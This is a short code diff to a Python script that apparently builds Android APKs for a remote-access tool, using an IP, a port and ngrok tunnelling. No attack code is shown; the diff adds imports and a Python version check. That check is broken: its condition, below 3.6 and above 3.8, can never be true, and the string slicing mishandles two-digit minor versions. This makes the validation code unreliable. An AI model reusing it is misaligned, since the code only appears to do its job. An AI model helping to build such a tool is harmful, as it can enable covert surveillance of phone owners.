@@ -1,7 +1,9 @@
 from utils import *
 import argparse
+import sys
 from colorama import Fore, Style,init
 from pyngrok import ngrok,conf
+import platform
 clearDirec()
 
 #                     _           _____         _______
@@ -21,6 +23,11 @@ parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
 parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
 parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
 args = parser.parse_args()
+
+
+
+if float(platform.python_version()[:-2]) < 3.6 and float(platform.python_version()[:-2]) > 3.8 :
+    print(stdOutput("error")+"\033[1mPython version should be between 3.6 to 3.8")
 
 
 if args.build:
